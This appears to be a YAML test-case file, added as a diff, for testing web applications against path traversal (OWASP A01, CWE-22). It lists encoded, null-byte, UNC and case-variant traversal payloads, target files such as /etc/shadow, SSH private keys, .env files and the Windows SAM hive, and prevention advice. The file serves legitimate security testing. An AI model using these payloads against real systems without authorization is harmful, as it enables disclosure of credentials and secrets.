@@ -1,0 +1,119 @@
+# A01:2025 - Broken Access Control - Path Traversal
+# CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+
+test_category: "A01-broken-access-control"
+subcategory: "path-traversal"
+owasp_2025: "A01"
+cwe: "CWE-22"
+severity: "HIGH"
+
+test_cases:
+  - id: "PATH-001"
+    name: "Basic Path Traversal"
+    description: "Access files outside web root using ../"
+    method: "GET"
+    payloads:
+      - "file=../../../etc/passwd"
+      - "page=../../../../windows/win.ini"
+      - "document=../../config/database.yml"
+      - "template=../../../app/config/secrets.json"
+    expected_result: "Access denied or sanitized path"
+    vulnerable_result: "File contents disclosed"
+    
+  - id: "PATH-002"
+    name: "URL Encoded Traversal"
+    description: "Bypass filters using encoding"
+    payloads:
+      - "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+      - "file=%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini"
+      - "file=..%252f..%252f..%252fetc/passwd"
+      - "file=..%c0%af..%c0%af..%c0%afetc/passwd"
+    
+  - id: "PATH-003"
+    name: "Double Encoding"
+    description: "Evade simple decode-and-check filters"
+    payloads:
+      - "file=%252e%252e%252f%252e%252e%252fetc/passwd"
+      - "file=%25%32%65%25%32%65%25%32%66" # ../../
+    
+  - id: "PATH-004"
+    name: "Null Byte Injection"
+    description: "Truncate file extension checks"
+    payloads:
+      - "file=../../../etc/passwd%00.jpg"
+      - "file=../../config/database.yml%00.png"
+      - "file=../../../.ssh/id_rsa%00.txt"
+    note: "Works in PHP < 5.3.4 and some other languages"
+    
+  - id: "PATH-005"
+    name: "Absolute Path Traversal"
+    description: "Use absolute paths to bypass relative path checks"
+    payloads:
+      - "file=/etc/passwd"
+      - "file=C:\\windows\\win.ini"
+      - "file=/var/www/html/config/database.yml"
+      - "file=file:///etc/passwd"
+    
+  - id: "PATH-006"
+    name: "UNC Path (Windows)"
+    description: "Access network shares on Windows"
+    payloads:
+      - "file=\\\\localhost\\c$\\windows\\win.ini"
+      - "file=\\\\127.0.0.1\\c$\\windows\\system32\\config\\sam"
+    
+  - id: "PATH-007"
+    name: "Case Sensitivity Bypass"
+    description: "Test case variations to bypass filters"
+    payloads:
+      - "file=..\\..\\..\\ETC/PASSWD"
+      - "file=..\\..\\..\\Etc/Passwd"
+      - "file=../../../eTc/pAsSwD"
+    
+  - id: "PATH-008"
+    name: "Overlong UTF-8"
+    description: "Use overlong UTF-8 encoding"
+    payloads:
+      - "file=..%c0%2f..%c0%2f..%c0%2fetc/passwd"
+      - "file=..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd"
+
+target_files_linux:
+  sensitive:
+    - "/etc/passwd"
+    - "/etc/shadow"
+    - "/etc/hosts"
+    - "/etc/hostname"
+    - "/etc/ssh/sshd_config"
+    - "/root/.ssh/id_rsa"
+    - "/home/{user}/.ssh/id_rsa"
+    - "/var/log/apache2/access.log"
+    - "/var/log/nginx/access.log"
+  application:
+    - "/var/www/html/.env"
+    - "/var/www/html/config/database.yml"
+    - "/var/www/html/storage/logs/laravel.log"
+    - "/opt/app/config/secrets.json"
+    - "/usr/local/apache2/conf/httpd.conf"
+
+target_files_windows:
+  sensitive:
+    - "C:\\windows\\win.ini"
+    - "C:\\windows\\system32\\config\\sam"
+    - "C:\\windows\\system32\\drivers\\etc\\hosts"
+    - "C:\\inetpub\\wwwroot\\web.config"
+    - "C:\\Program Files\\MySQL\\my.ini"
+  application:
+    - "C:\\inetpub\\wwwroot\\.env"
+    - "C:\\xampp\\htdocs\\config\\database.php"
+
+prevention:
+  - "Use whitelist of allowed files"
+  - "Validate filename against allowed pattern"
+  - "Use chroot jail or similar containment"
+  - "Reject input containing path traversal sequences"
+  - "Use secure file API (realpath, canonical path)"
+  - "Run with minimum privileges"
+
+references:
+  - "OWASP Top 10:2025 A01"
+  - "CWE-22: Path Traversal"
+  - "PayloadsAllTheThings: File Inclusion"
